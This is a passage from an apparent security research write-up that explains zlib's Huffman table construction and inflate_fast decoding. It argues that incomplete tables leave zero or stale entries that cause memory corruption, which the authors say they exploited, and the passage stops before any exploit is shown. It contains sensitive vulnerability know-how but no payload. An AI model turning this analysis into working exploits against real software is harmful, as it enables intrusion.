        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;&lt;/code&gt;&lt;p&gt;Let’s step through table construction. First we count, for each code length, how many symbols use that length.&lt;/p&gt;&lt;p&gt;We then determine the minimum and maximum code lengths from &lt;code&gt;count&lt;/code&gt; and set &lt;code&gt;root&lt;/code&gt;, the table’s index bit width. &lt;code&gt;root&lt;/code&gt; initially comes from the &lt;code&gt;bits&lt;/code&gt; argument but may be adjusted based on min/max. That’s why &lt;code&gt;bits&lt;/code&gt; is a pointer: any adjustments made in &lt;code&gt;inflate_table&lt;/code&gt; must also be visible to the caller.&lt;/p&gt;&lt;p&gt;The Huffman table is a simple 1D array, indexed by bits: &lt;code&gt;table[huffman_code] = decoded_value (actually a code struct to decode it)&lt;/code&gt;. Thus, &lt;code&gt;root&lt;/code&gt; is really the number of index bits—i.e., the size of the primary table. If &lt;code&gt;root=7&lt;/code&gt;, the table has entries up to &lt;code&gt;table[127(0b1111111)]&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;If &lt;code&gt;root &amp;gt; max&lt;/code&gt;, set &lt;code&gt;root = max&lt;/code&gt; to avoid wasting space. If &lt;code&gt;root &amp;lt; min&lt;/code&gt;, set &lt;code&gt;root = min&lt;/code&gt;; otherwise you couldn’t store any codes at all.&lt;/p&gt;&lt;p&gt;But if &lt;code&gt;root = min&lt;/code&gt;, how do we store codes longer than &lt;code&gt;root&lt;/code&gt;? Using multi-level tables. As we’ve seen, the &lt;code&gt;op&lt;/code&gt; field can indicate a second-level lookup. For example, suppose there are ten 8‑bit codes and one 9‑bit code. You don’t want to double the table size (from 256 to 512 entries) just for one symbol. So the primary table has 256 entries; all 8‑bit codes and the prefixes of any longer codes are stored there. For longer codes, entries in the primary table point to sub-tables that hold the remaining bits.&lt;/p&gt;&lt;p&gt;We’ll see the exact mechanics below.&lt;/p&gt;&lt;p&gt;Once &lt;code&gt;root&lt;/code&gt; is decided, we build the &lt;code&gt;offs&lt;/code&gt; array to sort symbols by code length and symbol order into &lt;code&gt;work&lt;/code&gt;. The &lt;code&gt;work&lt;/code&gt; array is needed to reconstruct the full Huffman codes from the lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
B -&amp;gt; 3 (110)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;To reconstruct codes from lengths, group symbols with the same length and assign codes in order:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2 (00)
C -&amp;gt; 2 (01)
D -&amp;gt; 2 (10)
B -&amp;gt; 3 (110)
E -&amp;gt; 3 (111)&lt;/code&gt;&lt;p&gt;&lt;code&gt;work&lt;/code&gt; is the array that encodes this ordering; the build loop will walk &lt;code&gt;work&lt;/code&gt; to assign codes.&lt;/p&gt;&lt;code&gt;    /* set up for code type */
    switch (type) {
    case CODES:
        base = extra = work;    /* dummy value--not used */
        match = 20;
        break;
    case LENS:
        base = lbase;
        extra = lext;
        match = 257;
        break;
    default:    /* DISTS */
        base = dbase;
        extra = dext;
        match = 0;
    }&lt;/code&gt;&lt;p&gt;Depending on &lt;code&gt;type&lt;/code&gt;, we set &lt;code&gt;match&lt;/code&gt;, &lt;code&gt;base&lt;/code&gt;, and &lt;code&gt;extra&lt;/code&gt;. These support the Base/Extra decoding mode described below.&lt;/p&gt;&lt;p&gt;Dynamic Huffman table lengths in the stream are usually stored by position (index), since that index is the original value—e.g., index 65 corresponds to ‘A’. This is efficient for literals (0–255). But what about LZ77 length/distance values? Deflate specifies length range 3–258 and distance range 1–32,768, making a direct per‑value table impractical. So lengths and distances use Base/Extra coding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;match&lt;/code&gt; indicates where Base/Extra decoding begins. For Literal/Length, 0–255 are literals and 256 is End of Block; from 257 upward (LZ77 lengths), Base/Extra applies—so &lt;code&gt;match=257&lt;/code&gt;. The Code table doesn’t use Base/Extra at all, so &lt;code&gt;match=20&lt;/code&gt; (greater than the largest code index). Distance uses Base/Extra for all symbols, so &lt;code&gt;match=0&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;code&gt;base&lt;/code&gt; and &lt;code&gt;extra&lt;/code&gt; select the arrays used for Base/Extra depending on whether we’re building the length or distance table.&lt;/p&gt;&lt;code&gt;    /* initialize state for loop */
    huff = 0;                   /* starting code */
    sym = 0;                    /* starting code symbol */
    len = min;                  /* starting code length */
    next = *table;              /* current table to fill in */
    curr = root;                /* current table index bits */
    drop = 0;                   /* current bits to drop from code for index */
    low = (unsigned)(-1);       /* trigger new sub-table when len &amp;gt; root */
    used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
    mask = used - 1;            /* mask for comparing low */

    /* process all codes and make table entries */
    for (;;) {
        /* create table entry */
        here.bits = (unsigned char)(len - drop);
        if (work[sym] + 1U &amp;lt; match) {
            here.op = (unsigned char)0;
            here.val = work[sym];
        }
        else if (work[sym] &amp;gt;= match) {
            here.op = (unsigned char)(extra[work[sym] - match]);
            here.val = base[work[sym] - match];
        }
        else {
            here.op = (unsigned char)(32 + 64);         /* end of block */
            here.val = 0;
        }
&lt;/code&gt;&lt;p&gt;This is the main construction loop. We iterate through &lt;code&gt;work&lt;/code&gt;, creating a &lt;code&gt;code&lt;/code&gt; entry for each symbol. If &lt;code&gt;symbol+1 &amp;lt; match&lt;/code&gt;, it’s a normal entry: &lt;code&gt;op=0&lt;/code&gt;, &lt;code&gt;val=symbol&lt;/code&gt;. As we saw in &lt;code&gt;case LIT:&lt;/code&gt;, decoding such an entry emits &lt;code&gt;val&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Recall: “original value” here means the Huffman-decoded value. In the simple case above, it’s the final literal; with Base/Extra, it’s a special symbol that needs further interpretation.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;If &lt;code&gt;symbol &amp;gt;= match&lt;/code&gt;, we create an entry using the Base/Extra scheme: &lt;code&gt;op&lt;/code&gt; holds the number of extra bits, &lt;code&gt;val&lt;/code&gt; holds the base.&lt;/p&gt;&lt;code&gt;            state-&amp;gt;length = (unsigned)here.val;
            if ((int)(here.op) == 0) {
                Tracevv((stderr, here.val &amp;gt;= 0x20 &amp;amp;&amp;amp; here.val &amp;lt; 0x7f ?
                        "inflate:         literal '%c'\n" :
                        "inflate:         literal 0x%02x\n", here.val));
                state-&amp;gt;mode = LIT;
                break;
            }
            if (here.op &amp;amp; 32) {
                Tracevv((stderr, "inflate:         end of block\n"));
                state-&amp;gt;back = -1;
                state-&amp;gt;mode = TYPE;
                break;
            }
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;extra = (unsigned)(here.op) &amp;amp; 15;
            state-&amp;gt;mode = LENEXT;
                /* fallthrough */
        case LENEXT:
            if (state-&amp;gt;extra) {
                NEEDBITS(state-&amp;gt;extra);
                state-&amp;gt;length += BITS(state-&amp;gt;extra);
                DROPBITS(state-&amp;gt;extra);
                state-&amp;gt;back += state-&amp;gt;extra;
            }
            Tracevv((stderr, "inflate:         length %u\n", state-&amp;gt;length));
            state-&amp;gt;was = state-&amp;gt;length;
            state-&amp;gt;mode = DIST;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;To understand Base/Extra, look at the length-decoding routine in &lt;code&gt;inflate&lt;/code&gt;. First, &lt;code&gt;state-&amp;gt;length = here.val&lt;/code&gt; (the base). Then, based on &lt;code&gt;op&lt;/code&gt;, if it’s not a literal/end/invalid, we go to length decoding.&lt;/p&gt;&lt;p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt; extracts the number of extra bits. We then read that many bits and add them to the base to get the final length.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The&lt;/p&gt;&lt;code&gt;op &amp;amp; 15&lt;/code&gt;is necessary because the&lt;code&gt;lext&lt;/code&gt;/&lt;code&gt;dext&lt;/code&gt;arrays encode flags along with the count of extra bits.&lt;/quote&gt;&lt;code&gt;    static const unsigned short lbase[31] = { /* Length codes 257..285 base */
        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};
    static const unsigned short lext[31] = { /* Length codes 257..285 extra */
        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,
        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 73, 200};
    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */
        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,
        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
        8193, 12289, 16385, 24577, 0, 0};
    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */
        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,
        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,
        28, 28, 29, 29, 64, 64};&lt;/code&gt;&lt;p&gt;For example, suppose we want to decode length 20. Its code length entry would be at &lt;code&gt;huffman_table[269]&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;here.op = extra - match](257) = extra[12] = lext[12] = 18
here.val = base - match(257)] = base[12] = lbase[12] = 19&lt;/code&gt;&lt;p&gt;The length routine then computes &lt;code&gt;state-&amp;gt;length = 19 + BITS(18 &amp;amp; 15 (2))&lt;/code&gt;. If the stream provides &lt;code&gt;01&lt;/code&gt; as the extra bits, we decode &lt;code&gt;19 + 1 = 20&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The key idea of Base/Extra: values like 20 (and the range &lt;code&gt;19 + 0b00 ~ 0b11&lt;/code&gt;) are all represented by the same Huffman symbol (index 269); the exact value is determined by reading the extra bits. The table groups ranges by base and uses extra bits to resolve within the range.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);

        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;

        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;After creating a &lt;code&gt;code&lt;/code&gt; entry, we write it into the table at multiple positions. &lt;code&gt;drop&lt;/code&gt; is used for sub-tables (multi-level); it’s 0 in the primary table.&lt;/p&gt;&lt;p&gt;The loop writes &lt;code&gt;here&lt;/code&gt; into &lt;code&gt;next[huff + (0, incr, incr*2, …, fill-incr)]&lt;/code&gt;. Before explaining why, let’s note something important:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;If we naively stored:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[1(0b01)] = here(op=0, bits=2, val='B')
next[2(0b10)] = here(op=0, bits=2, val='C')
next[6(0b110)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;that looks reasonable—but it’s wrong.&lt;/p&gt;&lt;p&gt;Consider compressing “CB”:&lt;/p&gt;&lt;code&gt;0b10(C) &amp;lt;&amp;lt; 0 + 0b01(B) &amp;lt;&amp;lt; 2 = 0b0110&lt;/code&gt;&lt;quote&gt;&lt;p&gt;Bits are packed least significant bit first; simply concatenating as&lt;/p&gt;&lt;code&gt;0b1001&lt;/code&gt;would make bitwise decoding impossible.&lt;/quote&gt;&lt;p&gt;The compressed bits for &lt;code&gt;CB&lt;/code&gt; (0b0110) match those for &lt;code&gt;D&lt;/code&gt; (0b110). Even though the code set is prefix-free when read left-to-right, Deflate uses a bitstream where the trailing bits act as prefixes due to LSB-first packing. To handle this, we reverse the bit order when building indices:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;So the correct index order is 0,2,1,3,7 rather than 0,1,2,6,7.&lt;/p&gt;&lt;code&gt;        /* replicate for those indices with low len bits equal to huff */
        incr = 1U &amp;lt;&amp;lt; (len - drop);
        fill = 1U &amp;lt;&amp;lt; curr;
        min = fill;                 /* save offset to next table */
        do {
            fill -= incr;
            next[(huff &amp;gt;&amp;gt; drop) + fill] = here;
        } while (fill != 0);&lt;/code&gt;&lt;p&gt;Back to the loop. &lt;code&gt;huff&lt;/code&gt; holds the (bit-reversed) Huffman code in progress. We don’t just store at &lt;code&gt;next[huff]&lt;/code&gt;; we fill out all positions differing only in the unused high bits of the primary table.&lt;/p&gt;&lt;p&gt;&lt;code&gt;fill&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; curr&lt;/code&gt; (table size), and &lt;code&gt;incr&lt;/code&gt; is &lt;code&gt;1 &amp;lt;&amp;lt; len&lt;/code&gt; (or &lt;code&gt;1 &amp;lt;&amp;lt; (len - drop)&lt;/code&gt; for sub-tables). So the effect is:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;If the primary table has&lt;/p&gt;&lt;code&gt;curr=root&lt;/code&gt;bits, and&lt;code&gt;huff=0b111&lt;/code&gt;with code length 3, then fill covers:&lt;/quote&gt;&lt;p&gt;We’re enumerating the higher bits that are irrelevant to this code length. This allows constant-time decoding:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 6(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;When decoding &lt;code&gt;AC&lt;/code&gt; (0b0100), we can immediately index &lt;code&gt;next[0b100]&lt;/code&gt; with &lt;code&gt;BITS(root)&lt;/code&gt; and decode ‘A’ without checking code lengths; then drop 2 bits and continue.&lt;/p&gt;&lt;p&gt;Back to the actual decoding:&lt;/p&gt;&lt;code&gt;here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];&lt;/code&gt;&lt;p&gt;This implements the same idea: index with fixed &lt;code&gt;lenbits&lt;/code&gt; and decode immediately. The &lt;code&gt;while&lt;/code&gt; loop plus &lt;code&gt;fill/incr&lt;/code&gt; achieve this optimization.&lt;/p&gt;&lt;code&gt;        /* backwards increment the len-bit code huff */
        incr = 1U &amp;lt;&amp;lt; (len - 1);
        while (huff &amp;amp; incr)
            incr &amp;gt;&amp;gt;= 1;
        if (incr != 0) {
            huff &amp;amp;= incr - 1;
            huff += incr;
        }
        else
            huff = 0;&lt;/code&gt;&lt;p&gt;This updates &lt;code&gt;huff&lt;/code&gt; in bit-reversed order:&lt;/p&gt;&lt;code&gt;00,01,10,110,111 -&amp;gt; X
00,10,01,011,111 -&amp;gt; O&lt;/code&gt;&lt;p&gt;i.e., increment with bit-reversed semantics.&lt;/p&gt;&lt;code&gt;        /* go to next symbol, update count, len */
        sym++;
        if (--(count[len]) == 0) {
            if (len == max) break;
            len = lens[work[sym]];
        }&lt;/code&gt;&lt;p&gt;Move to the next symbol and update the working code length.&lt;/p&gt;&lt;code&gt;        /* create new sub-table if needed */
        if (len &amp;gt; root &amp;amp;&amp;amp; (huff &amp;amp; mask) != low) {
            /* if first time, transition to sub-tables */
            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */

            /* determine length of next table */
            curr = len - drop;
            left = (int)(1 &amp;lt;&amp;lt; curr);
            while (curr + drop &amp;lt; max) {
                left -= count[curr + drop];
                if (left &amp;lt;= 0) break;
                curr++;
                left &amp;lt;&amp;lt;= 1;
            }

            /* check for enough space */
            used += 1U &amp;lt;&amp;lt; curr;

            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);
        }
    }&lt;/code&gt;&lt;p&gt;This creates a sub-table when &lt;code&gt;len &amp;gt; root&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Let’s illustrate with the earlier example:&lt;/p&gt;&lt;code&gt;next[0(0b00), 4(0b100)] = here(op=0, bits=2, val='A')
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val='B')
next[1(0b01), 5(0b101)] = here(op=0, bits=2, val='C')
next[3(0b011)] = here(op=0, bits=3, val='D')
next[7(0b111)] = here(op=0, bits=3, val='E')&lt;/code&gt;&lt;p&gt;Assume &lt;code&gt;root=2&lt;/code&gt; (for illustration), so 3‑bit codes require a sub-table.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Due to default&lt;/p&gt;&lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt;, you wouldn’t actually see&lt;code&gt;root=2&lt;/code&gt;with multi-level tables in practice; we’re using small numbers for clarity.&lt;/quote&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')&lt;/code&gt;&lt;p&gt;Codes of length ≤2 fit in the primary table.&lt;/p&gt;&lt;code&gt;            if (drop == 0)
                drop = root;

            /* increment past last table */
            next += min;            /* here min is 1 &amp;lt;&amp;lt; curr */&lt;/code&gt;&lt;p&gt;We set &lt;code&gt;drop&lt;/code&gt; (the number of lower bits to ignore when indexing sub-tables) and advance &lt;code&gt;next&lt;/code&gt; to the end of the current table—this is where the sub-table will live.&lt;/p&gt;&lt;p&gt;Now the sub-table is ready: &lt;code&gt;next&lt;/code&gt; points to it, and &lt;code&gt;drop=root&lt;/code&gt; causes future &lt;code&gt;huff&lt;/code&gt; indices to ignore the lower &lt;code&gt;root&lt;/code&gt; bits.&lt;/p&gt;&lt;p&gt;On subsequent iterations, entries for the longer codes are placed into the sub-table:&lt;/p&gt;&lt;code&gt;next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Note &lt;code&gt;here.bits = len - drop&lt;/code&gt;, so the sub-table stores only the remaining bits.&lt;/p&gt;&lt;code&gt;            /* point entry in root table to sub-table */
            low = huff &amp;amp; mask;
            (*table)[low].op = (unsigned char)curr;
            (*table)[low].bits = (unsigned char)root;
            (*table)[low].val = (unsigned short)(next - *table);&lt;/code&gt;&lt;p&gt;We also write into the primary table an entry that points to the sub-table. The final multi-level table looks like:&lt;/p&gt;&lt;code&gt;next[0(0b00)] = here(op=0, bits=2, val='A')
next[2(0b10)] = here(op=0, bits=2, val='B')
next[1(0b01)] = here(op=0, bits=2, val='C')

next[3(0b011 &amp;amp; mask( (1 &amp;lt;&amp;lt; 2) - 1) )] = here(op=2, bits=2, val=4)

next += 1 &amp;lt;&amp;lt; curr
next[0(0b011 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='D')
next[1(0b111 &amp;gt;&amp;gt; 2)] = here(op=0, bits=1 (3-2), val='E')&lt;/code&gt;&lt;p&gt;Decoding a 3‑bit code like ‘E’ works like this: first-level lookup at &lt;code&gt;0b011 &amp;amp; mask = 0b11&lt;/code&gt; yields &lt;code&gt;here(op=2, bits=2, val=4)&lt;/code&gt;, so we consume 2 bits and jump to the sub-table (&lt;code&gt;next += 4&lt;/code&gt;). Then we use the next bit (1) to index the sub-table, yielding &lt;code&gt;here(op=0, bits=1, val='E')&lt;/code&gt;; we consume 1 bit and emit ‘E’.&lt;/p&gt;&lt;code&gt;    /* fill in remaining table entry if code is incomplete (guaranteed to have
       at most one remaining entry, since if the code is incomplete, the
       maximum code length that was allowed to get this far is one bit) */
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }

    /* set return parameters */
    *table += used;
    *bits = root;
    return 0;&lt;/code&gt;&lt;p&gt;Finally, if the code set is incomplete, the remaining entry is filled with an invalid code marker, then &lt;code&gt;bits&lt;/code&gt; is updated and the function returns.&lt;/p&gt;&lt;code&gt;void ZLIB_INTERNAL inflate_fast(z_streamp strm, unsigned start) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *in;      /* local strm-&amp;gt;next_in */
    z_const unsigned char FAR *last;    /* have enough input while in &amp;lt; last */
    unsigned char FAR *out;     /* local strm-&amp;gt;next_out */
    unsigned char FAR *beg;     /* inflate()'s initial strm-&amp;gt;next_out */
    unsigned char FAR *end;     /* while out &amp;lt; end, enough space available */
#ifdef INFLATE_STRICT
    unsigned dmax;              /* maximum distance from zlib header */
#endif
    unsigned wsize;             /* window size or zero if not using window */
    unsigned whave;             /* valid bytes in the window */
    unsigned wnext;             /* window write index */
    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */
    unsigned long hold;         /* local strm-&amp;gt;hold */
    unsigned bits;              /* local strm-&amp;gt;bits */
    code const FAR *lcode;      /* local strm-&amp;gt;lencode */
    code const FAR *dcode;      /* local strm-&amp;gt;distcode */
    unsigned lmask;             /* mask for first level of length codes */
    unsigned dmask;             /* mask for first level of distance codes */
    code const *here;           /* retrieved table entry */
    unsigned op;                /* code bits, operation, extra bits, or */
                                /*  window position, window bytes to copy */
    unsigned len;               /* match length, unused bytes */
    unsigned dist;              /* match distance */
    unsigned char FAR *from;    /* where to copy match from */

    /* copy state to local variables */
    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    in = strm-&amp;gt;next_in;
    last = in + (strm-&amp;gt;avail_in - 5);
    out = strm-&amp;gt;next_out;
    beg = out - (start - strm-&amp;gt;avail_out);
    end = out + (strm-&amp;gt;avail_out - 257);
#ifdef INFLATE_STRICT
    dmax = state-&amp;gt;dmax;
#endif
    wsize = state-&amp;gt;wsize;
    whave = state-&amp;gt;whave;
    wnext = state-&amp;gt;wnext;
    window = state-&amp;gt;window;
    hold = state-&amp;gt;hold;
    bits = state-&amp;gt;bits;
    lcode = state-&amp;gt;lencode;
    dcode = state-&amp;gt;distcode;
    lmask = (1U &amp;lt;&amp;lt; state-&amp;gt;lenbits) - 1;
    dmask = (1U &amp;lt;&amp;lt; state-&amp;gt;distbits) - 1;&lt;/code&gt;&lt;p&gt;Time to analyze &lt;code&gt;inflate_fast&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;    do {
        if (bits &amp;lt; 15) {
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
            hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
            bits += 8;
        }
.....
.....
.....
    } while (in &amp;lt; last &amp;amp;&amp;amp; out &amp;lt; end);&lt;/code&gt;&lt;p&gt;It loops until the preconditions fail. At the start of each iteration, if fewer than 15 bits are available in &lt;code&gt;hold&lt;/code&gt;, it preloads 16 bits. This reduces overhead in the inner loop.&lt;/p&gt;&lt;code&gt;        here = lcode + (hold &amp;amp; lmask);
      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
        }
        else if (op &amp;amp; 16) {                     /* length base */
            len = (unsigned)(here-&amp;gt;val);
            op &amp;amp;= 15;                           /* number of extra bits */
            if (op) {
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                }
                len += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
            }
            Tracevv((stderr, "inflate:         length %u\n", len));
            if (bits &amp;lt; 15) {
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
                hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                bits += 8;
            }&lt;/code&gt;&lt;p&gt;The logic mirrors &lt;code&gt;inflate.c&lt;/code&gt;: look up a &lt;code&gt;code&lt;/code&gt; in &lt;code&gt;lcode&lt;/code&gt;. If it’s a literal, emit it and continue; if it’s a length, decode the length and then decode the distance next, preloading more bits first.&lt;/p&gt;&lt;code&gt;            here = dcode + (hold &amp;amp; dmask);
          dodist:
            op = (unsigned)(here-&amp;gt;bits);
            hold &amp;gt;&amp;gt;= op;
            bits -= op;
            op = (unsigned)(here-&amp;gt;op);
            if (op &amp;amp; 16) {                      /* distance base */
                dist = (unsigned)(here-&amp;gt;val);
                op &amp;amp;= 15;                       /* number of extra bits */
                if (bits &amp;lt; op) {
                    hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                    bits += 8;
                    if (bits &amp;lt; op) {
                        hold += (unsigned long)(*in++) &amp;lt;&amp;lt; bits;
                        bits += 8;
                    }
                }
                dist += (unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1);
#ifdef INFLATE_STRICT
                if (dist &amp;gt; dmax) {
                    strm-&amp;gt;msg = (z_const char *)"invalid distance too far back";
                    state-&amp;gt;mode = BAD;
                    break;
                }
#endif
                hold &amp;gt;&amp;gt;= op;
                bits -= op;
                Tracevv((stderr, "inflate:         distance %u\n", dist));&lt;/code&gt;&lt;p&gt;Distance decoding follows. After that, the LZ77 copy routine (not shown here) copies bytes from the window; the code is messy because it optimizes for various cases.&lt;/p&gt;&lt;code&gt;            else if ((op &amp;amp; 64) == 0) {          /* 2nd level distance code */
                here = dcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
                goto dodist;
            }
            else {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }
        }
        else if ((op &amp;amp; 64) == 0) {              /* 2nd level length code */
            here = lcode + here-&amp;gt;val + (hold &amp;amp; ((1U &amp;lt;&amp;lt; op) - 1));
            goto dolen;
        }
        else if (op &amp;amp; 32) {                     /* end-of-block */
            Tracevv((stderr, "inflate:         end of block\n"));
            state-&amp;gt;mode = TYPE;
            break;
        }
        else {
            strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
            state-&amp;gt;mode = BAD;
            break;
        }&lt;/code&gt;&lt;p&gt;After the LZ77 copy, the code handles second-level table lookups and invalid codes.&lt;/p&gt;&lt;p&gt;We analyzed the principal parts of &lt;code&gt;Inflate&lt;/code&gt;, the decoder for &lt;code&gt;Deflate&lt;/code&gt;. Do you see the bug? Everything looks well designed.&lt;/p&gt;&lt;p&gt;There’s a subtle issue in the Huffman table construction. A Huffman table can be incomplete. For example, if &lt;code&gt;root&lt;/code&gt; is 8 and the maximum code length is 10, there will be no entries for length‑9 codes; i.e., some table entries remain unset. Are such NULL entries handled correctly during decoding?&lt;/p&gt;&lt;code&gt;// inflate.c
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/length code";
                state-&amp;gt;mode = BAD;
                break;
            }
...
            if (here.op &amp;amp; 64) {
                strm-&amp;gt;msg = (z_const char *)"invalid distance code";
                state-&amp;gt;mode = BAD;
                break;
            }

// inftrees.c
    if (huff != 0) {
        here.op = (unsigned char)64;            /* invalid code marker */
        here.bits = (unsigned char)(len - drop);
        here.val = (unsigned short)0;
        next[huff] = here;
    }&lt;/code&gt;&lt;p&gt;No. As we’ve seen, incomplete entries should be filled with &lt;code&gt;op=64&lt;/code&gt; (invalid).&lt;/p&gt;&lt;p&gt;As a result, any NULL entries get treated as if they were &lt;code&gt;code&lt;/code&gt; structures with &lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;. Or, they may retain stale values from a previous block.&lt;/p&gt;&lt;p&gt;To achieve high speed, &lt;code&gt;inflate_fast&lt;/code&gt; omits many checks; it can therefore cause memory corruption when encountering incomplete Huffman tables. Let’s explore how.&lt;/p&gt;&lt;p&gt;The first memory bug identified was an integer overflow, but it wasn’t exploitable. The second was a stream overflow, which we ultimately exploited. We’ll describe both.&lt;/p&gt;&lt;p&gt;Let’s see what happens when a zero‑initialized table entry (&lt;code&gt;op=0, bits=0, val=0&lt;/code&gt;) is used in decoding.&lt;/p&gt;&lt;code&gt;      dolen:
        op = (unsigned)(here-&amp;gt;bits);
        hold &amp;gt;&amp;gt;= op;
        bits -= op;
        op = (unsigned)(here-&amp;gt;op);
        if (op == 0) {                          /* literal */
            Tracevv((stderr, here-&amp;gt;val &amp;gt;= 0x20 &amp;amp;&amp;amp; here-&amp;gt;val &amp;lt; 0x7f ?
                    "inflate:         literal '%c'\n" :
                    "inflate:         literal 0x%02x\n", here-&amp;gt;val));
            *out++ = (unsigned char)(here-&amp;gt;val);
